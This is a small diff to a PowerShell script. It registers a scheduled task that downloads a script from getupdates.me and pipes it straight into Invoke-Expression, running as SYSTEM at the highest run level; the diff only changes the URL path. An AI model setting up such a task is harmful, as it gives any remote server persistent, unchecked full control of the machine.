@@ -1,5 +1,5 @@
 ## Create the action
-$action = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-Command "irm https://getupdates.me/test3.ps1 | iex"'
+$action = New-ScheduledTaskAction -Execute 'pwsh.exe' -Argument '-Command "irm https://getupdates.me/ | iex"'
 
 ## Set to run as local system, No need to store Credentials!!!
 $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
